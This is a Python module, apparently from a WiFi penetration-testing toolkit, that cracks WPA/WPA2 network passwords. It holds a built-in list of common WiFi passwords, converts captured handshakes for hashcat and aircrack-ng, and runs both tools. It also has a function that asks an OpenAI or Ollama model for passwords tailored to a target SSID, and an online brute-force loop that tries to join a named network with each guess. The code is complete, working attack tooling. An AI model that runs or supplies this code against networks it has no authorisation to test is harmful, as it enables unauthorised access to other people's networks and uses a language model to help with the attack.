"""
WiFi Crack Module - Handshake conversion, hashcat/aircrack-ng integration,
AI-generated wordlists, and common WiFi password list.
WARNING: Authorized testing only.
"""

import os
import re
import shutil
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, List, Optional, Tuple

SCANS_DIR = Path(__file__).resolve().parent.parent / "scans"

COMMON_WIFI_PASSWORDS = [
    "12345678", "123456789", "1234567890", "password", "password1",
    "qwerty123", "abc12345", "iloveyou", "monkey123", "dragon123",
    "letmein1", "football1", "baseball1", "shadow12", "master12",
    "michael1", "jennifer1", "trustno1", "sunshine1", "welcome1",
    "password123", "admin1234", "guest1234", "default1", "changeme",
    "internet", "wireless", "wifi1234", "wifipass", "homewifi",
    "mywifi123", "network1", "security", "access12", "connect1",
    "11111111", "22222222", "12341234", "00000000", "88888888",
    "99999999", "13579246", "98765432", "87654321", "11223344",
    "aabbccdd", "abcdefgh", "abcd1234", "qwer1234", "asdf1234",
    "zxcv1234", "pass1234", "test1234", "user1234", "temp1234",
    "P@ssw0rd", "Passw0rd", "p@ssword", "P@ss1234", "Welcome1",
    "Qwerty12", "Admin123", "Root1234", "Super123", "Hello123",
    "princess", "charlie1", "thomas12", "jessica1", "michelle",
    "sweetie1", "loveyou1", "forever1", "summer12", "winter12",
    "spring12", "autumn12", "january1", "monday12", "friday12",
    "soccer12", "hockey12", "tennis12", "golf1234", "swimming",
    "batman12", "spider12", "superman", "ironman1", "avenger1",
    "starwars", "pokemon1", "mario123", "zelda123", "minecraft",
    "google12", "apple123", "samsung1", "android1", "windows1",
    "ubuntu12", "linux123", "chrome12", "firefox1", "amazon12",
    "facebook", "twitter1", "youtube1", "netflix1", "spotify1",
    "america1", "freedom1", "liberty1", "patriot1", "country1",
    "london12", "paris123", "newyork1", "tokyo123", "berlin12",
    "family12", "friends1", "school12", "work1234", "office12",
    "company1", "business", "personal", "private1", "secret12",
    "diamond1", "gold1234", "silver12", "platinum", "crystal1",
    "rainbow1", "dolphin1", "penguin1", "tiger123", "lion1234",
    "eagle123", "wolf1234", "bear1234", "shark123", "panther1",
    "coffee12", "pizza123", "burger12", "cookie12", "chocolate",
    "computer", "laptop12", "desktop1", "server12", "router12",
    "gateway1", "modem123", "switch12", "firewall", "antivirus",
    "1q2w3e4r", "q1w2e3r4", "zaq12wsx", "1qaz2wsx", "qazwsx12",
    "asdfghjk", "zxcvbnm1", "poiuytre", "lkjhgfds", "mnbvcxz1",
    "a1b2c3d4", "1a2b3c4d", "aaa11111", "bbb22222", "abc123456",
    "xyz12345", "qweasdzx", "1234qwer", "qwerty12", "asdfgh12",
    "testtest", "passpass", "adminadm", "rootroot", "useruser",
    "guest123", "visitor1", "temp1234", "trial123", "demo1234",
    "backup12", "recover1", "restore1", "support1", "service1",
    "orange12", "purple12", "yellow12", "green123", "blue1234",
    "red12345", "black123", "white123", "pink1234", "brown123",
    "mustang1", "corvette", "porsche1", "ferrari1", "mercedes",
    "toyota12", "honda123", "nissan12", "bmw12345", "audi1234",
    "music123", "guitar12", "piano123", "drums123", "singing1",
    "dancing1", "reading1", "cooking1", "travel12", "camping1",
    "fishing1", "hunting1", "garden12", "flowers1", "nature12",
    "ocean123", "mountain", "river123", "forest12", "desert12",
    "sunshine", "moonlight", "starlight", "midnight", "morning1",
    "heaven12", "angel123", "spirit12", "faith123", "hope1234",
    "love1234", "peace123", "happy123", "smile123", "laugh123",
]


@dataclass
class CrackResult:
    cracked: bool = False
    psk: str = ""
    method: str = ""
    duration: float = 0.0
    pcap_path: str = ""
    hash_path: str = ""


def _find_tool(name: str) -> Optional[str]:
    """Find an executable in PATH."""
    return shutil.which(name)


def handshake_to_hc22000(pcap_path: str) -> Optional[str]:
    """
    Convert .pcap to hashcat 22000 format (.hc22000).
    Uses hcxpcapngtool if available.
    Returns path to .hc22000 file, or None on failure.
    """
    tool = _find_tool("hcxpcapngtool")
    if not tool:
        tool = _find_tool("hcxpcaptool")
    if not tool:
        return None

    out_path = pcap_path.rsplit(".", 1)[0] + ".hc22000"
    rc = subprocess.run(
        [tool, "-o", out_path, pcap_path],
        capture_output=True, text=True, timeout=30,
    )
    if rc.returncode == 0 and Path(out_path).exists() and Path(out_path).stat().st_size > 0:
        return out_path
    pmkid_path = pcap_path.rsplit(".", 1)[0] + ".pmkid"
    if Path(pmkid_path).exists() and Path(pmkid_path).stat().st_size > 0:
        return pmkid_path
    return None


def handshake_to_hccapx(pcap_path: str) -> Optional[str]:
    """Convert .pcap to legacy .hccapx format for older hashcat/aircrack-ng."""
    tool = _find_tool("cap2hccapx") or _find_tool("cap2hccapx.bin")
    if not tool:
        return None
    out_path = pcap_path.rsplit(".", 1)[0] + ".hccapx"
    rc = subprocess.run(
        [tool, pcap_path, out_path],
        capture_output=True, text=True, timeout=30,
    )
    if rc.returncode == 0 and Path(out_path).exists():
        return out_path
    return None


def crack_with_hashcat(
    hash_path: str,
    wordlist_path: str,
    extra_args: Optional[list] = None,
    on_progress: Optional[Callable[[str], None]] = None,
) -> CrackResult:
    """
    Run hashcat against a hash file with a wordlist.
    Returns CrackResult.
    """
    hashcat = _find_tool("hashcat")
    if not hashcat:
        return CrackResult(method="hashcat not found")

    mode = "22000" if hash_path.endswith(".hc22000") else "2500"
    cmd = [hashcat, "-m", mode, hash_path, wordlist_path, "--force", "--quiet"]
    if extra_args:
        cmd.extend(extra_args)

    start = time.time()
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        psk = ""
        for line in proc.stdout:
            line = line.strip()
            if on_progress:
                on_progress(line)
            if ":" in line and not line.startswith("[") and not line.startswith("#"):
                parts = line.rsplit(":", 1)
                if len(parts) == 2 and len(parts[1]) >= 8:
                    psk = parts[1]
        proc.wait(timeout=7200)
    except Exception as e:
        return CrackResult(method=f"hashcat error: {e}")

    if not psk:
        potfile = Path(hash_path).with_suffix(".potfile")
        for pf in [potfile, Path.home() / ".hashcat" / "hashcat.potfile", Path.home() / ".local" / "share" / "hashcat" / "hashcat.potfile"]:
            if pf.exists():
                try:
                    for line in pf.read_text(errors="ignore").splitlines():
                        if ":" in line:
                            psk = line.rsplit(":", 1)[-1]
                except Exception:
                    pass

    return CrackResult(
        cracked=bool(psk),
        psk=psk,
        method="hashcat",
        duration=time.time() - start,
        hash_path=hash_path,
    )


def crack_with_aircrack(
    pcap_path: str,
    wordlist_path: str,
    on_progress: Optional[Callable[[str], None]] = None,
) -> CrackResult:
    """
    Run aircrack-ng against a pcap with a wordlist.
    Returns CrackResult.
    """
    aircrack = _find_tool("aircrack-ng")
    if not aircrack:
        return CrackResult(method="aircrack-ng not found")

    start = time.time()
    try:
        proc = subprocess.Popen(
            [aircrack, "-w", wordlist_path, "-q", pcap_path],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )
        psk = ""
        for line in proc.stdout:
            line = line.strip()
            if on_progress:
                on_progress(line)
            match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", line)
            if match:
                psk = match.group(1)
        proc.wait(timeout=7200)
    except Exception as e:
        return CrackResult(method=f"aircrack-ng error: {e}")

    return CrackResult(
        cracked=bool(psk),
        psk=psk,
        method="aircrack-ng",
        duration=time.time() - start,
        pcap_path=pcap_path,
    )


def generate_ai_wordlist(
    ssid: str,
    bssid: str = "",
    security_type: str = "WPA2",
    max_passwords: int = 200,
) -> str:
    """
    Use AI (OpenAI/Ollama) to generate likely WiFi passwords based on SSID context.
    Writes to scans/ai_wordlist_<ssid>.txt. Returns path to wordlist file.
    """
    SCANS_DIR.mkdir(parents=True, exist_ok=True)
    safe_ssid = "".join(c if c.isalnum() or c in "-_" else "_" for c in ssid)
    wordlist_path = str(SCANS_DIR / f"ai_wordlist_{safe_ssid}.txt")

    try:
        from openai import OpenAI
    except ImportError:
        print("  AI wordlist: openai not installed, using built-in list only")
        return _write_builtin_wordlist(wordlist_path)

    base_url = os.environ.get("OPENAI_API_BASE") or os.environ.get("OPENAI_BASE_URL")
    api_key = os.environ.get("OPENAI_API_KEY")
    if base_url and not api_key:
        api_key = "ollama"
    if not base_url and not api_key:
        print("  AI wordlist: no API key or base URL set, using built-in list only")
        return _write_builtin_wordlist(wordlist_path)

    model = os.environ.get("AI_MODEL")
    if not model and base_url and ("11434" in str(base_url) or "localhost" in str(base_url).lower()):
        model = "llama3.1"
    if not model:
        model = "gpt-4o-mini"

    prompt = (
        f"Generate {max_passwords} likely WiFi passwords for a network named '{ssid}' "
        f"with {security_type} security. Include: common weak passwords (8+ chars), "
        f"variations of the SSID with numbers/symbols, ISP default patterns, "
        f"keyboard walks, common phrases with number suffixes, pet/family name patterns. "
        f"One password per line. Only passwords, no numbering or explanation."
    )

    try:
        client = OpenAI(api_key=api_key, base_url=base_url) if base_url else OpenAI(api_key=api_key)
        r = client.chat.completions.create(
            model=model,
            messages=[
                {"role": "system", "content": "You generate WiFi password wordlists for authorized penetration testing. Output only passwords, one per line."},
                {"role": "user", "content": prompt},
            ],
            max_tokens=4096,
            temperature=0.7,
        )
        text = (r.choices[0].message.content or "").strip()
        ai_passwords = [line.strip() for line in text.splitlines() if line.strip() and len(line.strip()) >= 8]
    except Exception as e:
        print(f"  AI wordlist generation failed: {e}")
        ai_passwords = []

    all_passwords = list(dict.fromkeys(ai_passwords + COMMON_WIFI_PASSWORDS))
    with open(wordlist_path, "w", encoding="utf-8") as f:
        for pw in all_passwords:
            f.write(pw + "\n")
    print(f"  AI wordlist: {len(all_passwords)} passwords written to {wordlist_path}")
    return wordlist_path


def _write_builtin_wordlist(path: str) -> str:
    """Write the built-in common WiFi password list to a file."""
    with open(path, "w", encoding="utf-8") as f:
        for pw in COMMON_WIFI_PASSWORDS:
            f.write(pw + "\n")
    return path


def online_wifi_bruteforce(
    ssid: str,
    bssid: str = "",
    use_ai: bool = True,
    user_wordlist: Optional[str] = None,
    interface: Optional[str] = None,
    on_progress: Optional[Callable[[str], None]] = None,
) -> CrackResult:
    """
    Online brute-force: try connecting to the WiFi with each password directly.
    No monitor mode or handshake capture needed - works on any OS with any WiFi card.
    Much slower than offline cracking (~5-10s per attempt) but zero extra hardware required.
    """
    from scanner.wifi_connect import connect_to_wifi, disconnect_from_wifi

    def _log(msg: str):
        if on_progress:
            on_progress(msg)
        else:
            print(f"  {msg}")

    _log(f"Online brute-force against '{ssid}' (connecting with each password)")
    _log("This works without monitor mode but is slower (~5-10s per attempt).")

    _log("Building wordlist...")
    if use_ai:
        wl_path = generate_ai_wordlist(ssid, bssid)
    else:
        SCANS_DIR.mkdir(parents=True, exist_ok=True)
        wl_path = str(SCANS_DIR / "builtin_wifi_wordlist.txt")
        _write_builtin_wordlist(wl_path)

    passwords: List[str] = []
    with open(wl_path, encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]
    if user_wordlist and Path(user_wordlist).exists():
        with open(user_wordlist, encoding="utf-8") as f:
            extra = [line.strip() for line in f if line.strip()]
        passwords = list(dict.fromkeys(passwords + extra))

    _log(f"Trying {len(passwords)} passwords...")
    start = time.time()

    for i, pw in enumerate(passwords, 1):
        if i % 10 == 1 or i <= 5:
            _log(f"[{i}/{len(passwords)}] Trying: {pw}")
        else:
            _log(f"[{i}/{len(passwords)}] Trying: {'*' * min(len(pw), 8)}")

        connected, iface = connect_to_wifi(ssid, pw, interface)
        if connected:
            duration = time.time() - start
            _log(f"KEY FOUND: {pw}  (attempt {i}/{len(passwords)}, {duration:.1f}s)")
            disconnect_from_wifi(ssid, iface)
            time.sleep(2)
            return CrackResult(
                cracked=True,
                psk=pw,
                method="online brute-force",
                duration=duration,
            )
        time.sleep(1)

    duration = time.time() - start
    _log(f"Online brute-force exhausted ({len(passwords)} passwords, {duration:.1f}s). Key not found.")
    return CrackResult(
        cracked=False,
        method="online brute-force (exhausted)",
        duration=duration,
    )


def crack_handshake(
    pcap_path: str,
    ssid: str = "",
    bssid: str = "",
    use_ai: bool = True,
    user_wordlist: Optional[str] = None,
    on_progress: Optional[Callable[[str], None]] = None,
) -> CrackResult:
    """
    Orchestrator: try to crack a captured handshake.
    1. Convert to hashcat format (if hcxpcapngtool available)
    2. Try built-in + AI wordlist
    3. Try user-supplied wordlist
    4. Fall back to aircrack-ng if hashcat unavailable
    Returns CrackResult.
    """
    def _log(msg: str):
        if on_progress:
            on_progress(msg)
        else:
            print(f"  {msg}")

    if not Path(pcap_path).exists():
        _log(f"Pcap not found: {pcap_path}")
        return CrackResult(pcap_path=pcap_path)

    _log("Generating wordlist...")
    if use_ai:
        wordlist_path = generate_ai_wordlist(ssid, bssid)
    else:
        SCANS_DIR.mkdir(parents=True, exist_ok=True)
        wordlist_path = str(SCANS_DIR / "builtin_wifi_wordlist.txt")
        _write_builtin_wordlist(wordlist_path)

    wordlists = [wordlist_path]
    if user_wordlist and Path(user_wordlist).exists():
        wordlists.append(user_wordlist)

    hashcat_available = bool(_find_tool("hashcat"))
    aircrack_available = bool(_find_tool("aircrack-ng"))

    hash_path = None
    if hashcat_available:
        _log("Converting handshake for hashcat...")
        hash_path = handshake_to_hc22000(pcap_path)
        if not hash_path:
            hash_path = handshake_to_hccapx(pcap_path)

    for wl in wordlists:
        wl_name = Path(wl).name
        if hash_path and hashcat_available:
            _log(f"Cracking with hashcat ({wl_name})...")
            result = crack_with_hashcat(hash_path, wl, on_progress=on_progress)
            if result.cracked:
                _log(f"KEY FOUND: {result.psk} (hashcat, {result.duration:.1f}s)")
                result.pcap_path = pcap_path
                return result

        if aircrack_available:
            _log(f"Cracking with aircrack-ng ({wl_name})...")
            result = crack_with_aircrack(pcap_path, wl, on_progress=on_progress)
            if result.cracked:
                _log(f"KEY FOUND: {result.psk} (aircrack-ng, {result.duration:.1f}s)")
                return result

    if not hashcat_available and not aircrack_available:
        _log(
            "Neither hashcat nor aircrack-ng found. "
            f"Handshake saved at {pcap_path} for offline cracking. "
            "Install hashcat (GPU) or aircrack-ng (CPU) to crack."
        )
        return CrackResult(pcap_path=pcap_path, method="no cracking tool available")

    _log("Key not found with available wordlists.")
    return CrackResult(pcap_path=pcap_path, method="exhausted wordlists")
